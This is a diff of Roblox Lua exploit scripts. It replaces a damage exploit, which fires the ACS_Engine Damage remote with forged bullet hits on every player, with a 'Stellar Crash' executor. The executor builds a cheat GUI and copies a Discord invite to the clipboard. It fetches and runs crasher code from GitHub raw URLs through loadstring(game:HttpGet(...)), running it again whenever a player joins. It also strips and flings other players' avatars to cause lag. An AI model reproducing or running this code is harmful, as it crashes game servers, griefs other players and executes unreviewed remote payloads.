@@ -1,87 +1,406 @@
--- Pre-fetch services and reusable data for better performance
-local playersService = game:GetService("Players")
-local playersFolder = game:GetService("Workspace"):FindFirstChild("FPlayers")
-local replicatedStorage = game:GetService("ReplicatedStorage")
-local acsEngine = replicatedStorage:WaitForChild("ACS_Engine", 9e9)
-local eventsFolder = acsEngine and acsEngine:WaitForChild("Events", 9e9)
-local damageEvent = eventsFolder and eventsFolder:WaitForChild("Damage", 9e9)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+--this is confi
+local guiBackgroundColor = Color3.fromRGB(40, 40, 40)
+local guiTextColor = Color3.fromRGB(255, 255, 255)
+local guiStrokeColor = Color3.fromRGB(0, 0, 0)
+local guiTransparency = 0.5
+local guiStrokeTransparency = 0
+local guiCornerRadius = UDim.new(0, 4)
+local buttonCornerRadius = UDim.new(0, 4)
+local copySoundId = 4499400560
+local autoWalkEnabled = false
 
--- Pre-fetch static data
-local origin = Vector3.new(-272.4232177734375, -14.307608604431152, -23.735084533691406)
-local weaponName = "M4A1"
-local bulletIDPrefix = "unique_bullet_id_"
+-- gui thing
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "crashscript"
+screenGui.Parent = game.CoreGui 
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = guiBackgroundColor
+mainFrame.BackgroundTransparency = guiTransparency
+mainFrame.BorderColor3 = guiStrokeColor
+mainFrame.BorderMode = Enum.BorderMode.Inset
+mainFrame.BorderSizePixel = 1
+mainFrame.Position = UDim2.new(0.1, 0, 0.1, 0)
+mainFrame.Size = UDim2.new(0, 250, 0, 250) 
+mainFrame.Active = true 
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.BackgroundColor3 = guiBackgroundColor
+toggleButton.BackgroundTransparency = guiTransparency
+toggleButton.BorderColor3 = guiStrokeColor
+toggleButton.BorderSizePixel = 1
+toggleButton.Position = UDim2.new(1, -20, 0, 0) 
+toggleButton.Size = UDim2.new(0, 20, 0, 20)
+toggleButton.Font = Enum.Font.SourceSans
+toggleButton.Text = "X" 
+toggleButton.TextColor3 = guiTextColor
+toggleButton.Parent = mainFrame
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ReopenGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local reopenButton = Instance.new("TextButton")
+reopenButton.Name = "ReopenButton"
+reopenButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+reopenButton.BackgroundTransparency = 0.2
+reopenButton.BorderSizePixel = 0
+reopenButton.Position = UDim2.new(0.5, -25, 0.5, -25)
+reopenButton.Size = UDim2.new(0, 50, 0, 50)
+reopenButton.Font = Enum.Font.Arcade
+reopenButton.Text = "Open"
+reopenButton.TextSize = 18
+reopenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+reopenButton.Visible = false 
+reopenButton.Parent = screenGui
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0.5, 0)
+corner.Parent = reopenButton
+local dragging
+local dragInput
+local dragStart
+local startPos
+local function update(input)
+    local delta = input.Position - dragStart
+    reopenButton.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+reopenButton.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = reopenButton.Position
 
--- Cache args template to avoid creating it repeatedly
-local argsTemplate = {
-    [1] = {
-        origin = origin,
-        weaponName = weaponName,
-        bulletID = nil, -- To be set dynamically
-        currentPenetrationCount = 1,
-        shellSpeed = 210,
-        maxPenetrationCount = 1,
-        registeredParts = {},
-        penetrationMultiplier = 0.8,
-        shellType = "Bullet",
-        shellMaxDist = 7000,
-        filterDescendants = {},
-    },
-    [2] = nil, -- humanoid target
-    [3] = 154.2140350341797, -- Distance value
-    [4] = 2, -- Additional parameter
-    [5] = nil, -- Hitbox part target
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+reopenButton.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        update(input)
+    end
+end)
+local fpsLabel = Instance.new("TextLabel")
+fpsLabel.Name = "FPSLabel"
+fpsLabel.BackgroundColor3 = guiBackgroundColor
+fpsLabel.BackgroundTransparency = guiTransparency
+fpsLabel.Position = UDim2.new(0.05, 0, 0.05, 0)
+fpsLabel.Size = UDim2.new(0.9, 0, 0, 20)
+fpsLabel.Font = Enum.Font.SourceSansBold
+fpsLabel.Text = "FPS: 0"
+fpsLabel.TextColor3 = guiTextColor
+fpsLabel.TextSize = 18 
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
+fpsLabel.Parent = mainFrame
+local serverTimeLabel = Instance.new("TextLabel")
+serverTimeLabel.Name = "ServerTimeLabel"
+serverTimeLabel.BackgroundColor3 = guiBackgroundColor
+serverTimeLabel.BackgroundTransparency = guiTransparency
+serverTimeLabel.Position = UDim2.new(0.05, 0, 0.15, 0)
+serverTimeLabel.Size = UDim2.new(0.9, 0, 0, 20)
+serverTimeLabel.Font = Enum.Font.SourceSansBold
+serverTimeLabel.Text = "Server Time: "
+serverTimeLabel.TextColor3 = guiTextColor
+serverTimeLabel.TextSize = 18 
+serverTimeLabel.TextXAlignment = Enum.TextXAlignment.Left
+serverTimeLabel.Parent = mainFrame
+local localTimeLabel = Instance.new("TextLabel")
+localTimeLabel.Name = "LocalTimeLabel"
+localTimeLabel.BackgroundColor3 = guiBackgroundColor
+localTimeLabel.BackgroundTransparency = guiTransparency
+localTimeLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
+localTimeLabel.Size = UDim2.new(0.9, 0, 0, 20)
+localTimeLabel.Font = Enum.Font.SourceSansBold
+localTimeLabel.Text = "Local Time: "
+localTimeLabel.TextColor3 = guiTextColor
+localTimeLabel.TextSize = 18 
+localTimeLabel.TextXAlignment = Enum.TextXAlignment.Left
+localTimeLabel.Parent = mainFrame
+local playerNameLabel = Instance.new("TextLabel")
+playerNameLabel.Name = "PlayerNameLabel"
+playerNameLabel.BackgroundColor3 = guiBackgroundColor
+playerNameLabel.BackgroundTransparency = guiTransparency
+playerNameLabel.Position = UDim2.new(0.05, 0, 0.35, 0)
+playerNameLabel.Size = UDim2.new(0.9, 0, 0, 20)
+playerNameLabel.Font = Enum.Font.SourceSansBold
+playerNameLabel.Text = "Player: "
+playerNameLabel.TextColor3 = guiTextColor
+playerNameLabel.TextSize = 18 
+playerNameLabel.TextXAlignment = Enum.TextXAlignment.Left
+playerNameLabel.Parent = mainFrame
+local playerCountLabel = Instance.new("TextLabel")
+playerCountLabel.Name = "PlayerCountLabel"
+playerCountLabel.BackgroundColor3 = guiBackgroundColor
+playerCountLabel.BackgroundTransparency = guiTransparency
+playerCountLabel.Position = UDim2.new(0.05, 0, 0.45, 0)
+playerCountLabel.Size = UDim2.new(0.9, 0, 0, 20)
+playerCountLabel.Font = Enum.Font.SourceSansBold
+playerCountLabel.Text = "Players: "
+playerCountLabel.TextColor3 = guiTextColor
+playerCountLabel.TextSize = 18 
+playerCountLabel.TextXAlignment = Enum.TextXAlignment.Left
+playerCountLabel.Parent = mainFrame
+local copyLinkButton = Instance.new("TextButton")
+copyLinkButton.Name = "CopyLinkButton"
+copyLinkButton.BackgroundColor3 = guiBackgroundColor
+copyLinkButton.BackgroundTransparency = guiTransparency
+copyLinkButton.BorderColor3 = guiStrokeColor
+copyLinkButton.BorderSizePixel = 1
+copyLinkButton.Position = UDim2.new(0.05, 0, 0.6, 0)
+copyLinkButton.Size = UDim2.new(0.9, 0, 0, 30)
+copyLinkButton.Font = Enum.Font.SourceSansBold
+copyLinkButton.Text = "Copy Link"
+copyLinkButton.TextColor3 = guiTextColor
+copyLinkButton.TextSize = 18 
+copyLinkButton.Parent = mainFrame
+local autoWalkToggle = Instance.new("TextButton")
+autoWalkToggle.Name = "AutoWalkToggle"
+autoWalkToggle.BackgroundColor3 = guiBackgroundColor
+autoWalkToggle.BackgroundTransparency = guiTransparency
+autoWalkToggle.BorderColor3 = guiStrokeColor
+autoWalkToggle.BorderSizePixel = 1
+autoWalkToggle.Position = UDim2.new(0.05, 0, 0.75, 0)
+autoWalkToggle.Size = UDim2.new(0.9, 0, 0, 30)
+autoWalkToggle.Font = Enum.Font.SourceSansBold
+autoWalkToggle.Text = "Auto Walk: OFF"
+autoWalkToggle.TextColor3 = guiTextColor
+autoWalkToggle.TextSize = 18 
+autoWalkToggle.Parent = mainFrame
+local function addCornerRadius(object, cornerRadius)
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = cornerRadius
+    UICorner.Parent = object
+end
+addCornerRadius(mainFrame, guiCornerRadius)
+addCornerRadius(toggleButton, buttonCornerRadius)
+addCornerRadius(copyLinkButton, buttonCornerRadius)
+addCornerRadius(autoWalkToggle, buttonCornerRadius)
+addCornerRadius(reopenButton, buttonCornerRadius) 
+local hue = 0
+local function updateRainbow()
+    hue = hue + 0.001 
+    if hue > 1 then hue = 0 end
+    mainFrame.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
+    reopenButton.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
+end
+RunService.RenderStepped:Connect(updateRainbow)
+local guiVisible = true
+toggleButton.MouseButton1Click:Connect(function()
+    guiVisible = not guiVisible
+
+    local goal = {}
+    if guiVisible then
+        goal.Position = UDim2.new(0.1, 0, 0.1, 0)
+        reopenButton.Visible = false
+    else
+        goal.Position = UDim2.new(0.1, 0, 1, mainFrame.AbsoluteSize.Y)
+        reopenButton.Visible = true
+    end
+
+    TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), goal):Play()
+end)
+reopenButton.MouseButton1Click:Connect(function()
+    guiVisible = true
+    reopenButton.Visible = false
+    local goal = {Position = UDim2.new(0.1, 0, 0.1, 0)}
+    TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), goal):Play()
+end)
+local frames, lastUpdateTime = 0, tick()
+
+RunService.RenderStepped:Connect(function()
+    frames = frames + 1
+
+    -- Calculate FPS every 1 second (1000ms)
+    if tick() - lastUpdateTime >= 1 then
+        local fps = frames / (tick() - lastUpdateTime)
+        frames = 0
+        lastUpdateTime = tick()
+
+        -- Update FPS display with the calculated FPS
+        fpsLabel.Text = "FPS: " .. math.floor(fps)
+    end
+end)
+local function updateDateTime()
+    local serverTime = os.date("!*t")
+    local localTime = os.date("*t")
+    serverTimeLabel.Text = "Server Time: " .. serverTime.hour .. ":" .. serverTime.min .. ":" .. serverTime.sec .. " " .. serverTime.month .. "/" .. serverTime.day .. "/" .. serverTime.year
+    localTimeLabel.Text = "Local Time: " .. localTime.hour .. ":" .. localTime.min .. ":" .. localTime.sec .. " " .. localTime.month .. "/" .. localTime.day .. "/" .. localTime.year
+end
+local function updatePlayerCount()
+    playerCountLabel.Text = "Players: " .. #Players:GetPlayers()
+end
+local function updatePlayerName()
+    playerNameLabel.Text = "Player: " .. Players.LocalPlayer.DisplayName
+end
+updateDateTime()
+updatePlayerCount()
+updatePlayerName()
+RunService.Heartbeat:Connect(updateDateTime)
+Players.PlayerAdded:Connect(updatePlayerCount)
+Players.PlayerRemoving:Connect(updatePlayerCount)
+Players.LocalPlayer:GetPropertyChangedSignal("DisplayName"):Connect(updatePlayerName)
+local function copyLink()
+    local linkToCopy = "https://discord.gg/ZRVt8Cbh" 
+    setclipboard(linkToCopy)
+
+    local copySound = Instance.new("Sound")
+    copySound.SoundId = "rbxassetid://4499400560 " .. copySoundId -- this is the audio thing you can change it 
+    copySound.Parent = copyLinkButton
+    copySound.PlayOnRemove = true
+    copySound:Destroy()
+
+    StarterGui:SetCore("SendNotification", {
+        Title = "Discord Copied!",
+        Text = "The link has been copied to your clipboard.",
+        Duration = 3
+    })
+end
+copyLinkButton.MouseButton1Click:Connect(copyLink)
+local function isGameSupported()
+    for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
+        if item.Name:lower():find("bloxbiz") then
+            return true
+        end
+    end
+    return false
+end
+if not isGameSupported() then
+    StarterGui:SetCore("SendNotification", {
+        Title = "Unsupported Game",
+        Text = "This game is not supported. Script execution halted.",
+        Duration = 5
+    })
+    return
+else
+StarterGui:SetCore("SendNotification", {
+        Title = "Game Supported",
+        Text = "This game is supported. Stellar Crash is initializing...",
+        Duration = 5
+    })
+end 
+local function removeAllAccessories()
+    for _, player in pairs(Players:GetPlayers()) do
+        local character = player.Character
+        if character then
+            for _, item in pairs(character:GetDescendants()) do
+                if item:IsA("Accessory") or item:IsA("Hat") then
+                    item:Destroy()
+                end
+            end
+        end
+    end
+end
+local function induceLag()
+    for _, player in pairs(Players:GetPlayers()) do
+        local character = player.Character
+        if character then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Velocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
+                    part.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
+                end
+            end
+        end
+    end
+end
+local loadstringUrls = {
+    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt",
+    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/c.txt"
 }
-
--- Pre-fetch common checks outside of the loop
-local function getTargetData(playerModel)
-    local humanoid = playerModel:FindFirstChild("Humanoid")
-    local leftLowerArm = playerModel:FindFirstChild("LeftLowerArm")
-    local hitboxLeftLowerArm = leftLowerArm and leftLowerArm:FindFirstChild("HitboxLeftLowerArm")
-
-    if humanoid and hitboxLeftLowerArm then
-        return humanoid, hitboxLeftLowerArm
+local currentUrlIndex = 1
+local function executeStellarCrash()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(loadstringUrls[currentUrlIndex]))()
+    end)
+    if not success then
+    else
     end
+    currentUrlIndex = currentUrlIndex == 1 and 2 or 1
 end
+StarterGui:SetCore("SendNotification", {
+    Title = "Stellar Crash Initialized",
+    Text = "The crash script has been executed for the first time.",
+    Duration = 5
+})
+executeStellarCrash()
+Players.PlayerAdded:Connect(function(player)
+StarterGui:SetCore("SendNotification", {
+        Title = "New Player Joined",
+        Text = player.Name .. " joined the game. Refreshing Stellar Crash.",
+        Duration = 5
+    })
+    wait(2)
+    executeStellarCrash()
+   player.CharacterAdded:Connect(function()
+StarterGui:SetCore("SendNotification", {
+            Title = "Accessories Removed",
+            Text = "All accessories have been removed for " .. player.Name .. ".",
+            Duration = 5
+        })
+        removeAllAccessories()
+    end)
+end)
+RunService.RenderStepped:Connect(function()
+    frames = frames + 1
+    if tick() - lastUpdateTime >= 0.1 then
+        local fps = frames / (tick() - lastUpdateTime)
+        frames = 0
+        lastUpdateTime = tick()
+        fpsLabel.Text = "FPS: " .. math.floor(fps)
+        
+        if fps < 20 then
+            -- Send notification about low FPS
+            StarterGui:SetCore("SendNotification", {
+                Title = "Low FPS Detected",
+                Text = "FPS dropped below 20. Accessories removed.",
+                Duration = 5
+            })
 
--- Function to handle targeting logic
-local function handleTarget(playerModel)
-    -- Fetch humanoid and hitbox references
-    local humanoid, hitboxLeftLowerArm = getTargetData(playerModel)
-    if not humanoid then return end -- Skip if no humanoid found
-
-    -- Set dynamic values for args
-    argsTemplate[1].bulletID = bulletIDPrefix .. tostring(math.random())  -- Unique bullet ID
-    argsTemplate[2] = humanoid -- Target the player's humanoid
-    argsTemplate[5] = hitboxLeftLowerArm -- Target the hitbox part
-    argsTemplate[1].registeredParts[hitboxLeftLowerArm] = true
-
-    -- Invoke the damage event for this player
-    damageEvent:InvokeServer(unpack(argsTemplate))
-end
-
--- Function to process all players asynchronously
-local function processAllPlayersAsync()
-    -- Process Players Service
-    local players = playersService:GetPlayers()
-    for i = 1, #players do
-        local player = players[i]
-        if player.Character then
-            task.spawn(function()
-                handleTarget(player.Character)
-            end)
+            -- Remove accessories and induce lag
+            removeAllAccessories()
+            induceLag()
         end
     end
-
-    -- Process Players Folder (FPlayers)
-    if playersFolder then
-        local playerModels = playersFolder:GetChildren()
-        for i = 1, #playerModels do
-            task.spawn(function()
-                handleTarget(playerModels[i])
-            end)
+end)
+local function moveRandomly()
+    while autoWalkEnabled do
+        local humanoid = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+humanoid:MoveTo(Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-50, 50), 0, math.random(-50, 50)))
+wait(0.1)
         end
+        RunService.Heartbeat:Wait()
     end
 end
+autoWalkToggle.MouseButton1Click:Connect(function()
+    autoWalkEnabled = not autoWalkEnabled
+    autoWalkToggle.Text = "Auto Walk: " .. (autoWalkEnabled and "ON" or "OFF")
 
--- Execute the function immediately without waiting (asynchronously)
-processAllPlayersAsync()
+    if autoWalkEnabled then
+        moveRandomly()
+    else
+        local humanoid = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:MoveTo(Players.LocalPlayer.Character.HumanoidRootPart.Position)
+        end
+    end
+end)
